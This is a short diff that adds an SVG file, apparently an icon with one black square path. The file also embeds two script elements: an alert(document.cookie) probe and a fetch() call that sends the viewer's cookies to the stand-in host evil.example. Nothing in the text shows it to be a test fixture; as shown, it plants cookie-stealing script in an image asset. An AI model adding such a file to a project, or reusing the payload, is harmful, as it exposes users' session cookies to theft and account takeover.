@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+  <script type="text/javascript">alert(document.cookie)</script>
+  <script><![CDATA[ fetch("https://evil.example/" + document.cookie) ]]></script>
+  <path d="M2 2h20v20H2z" fill="#000000"/>
+</svg>
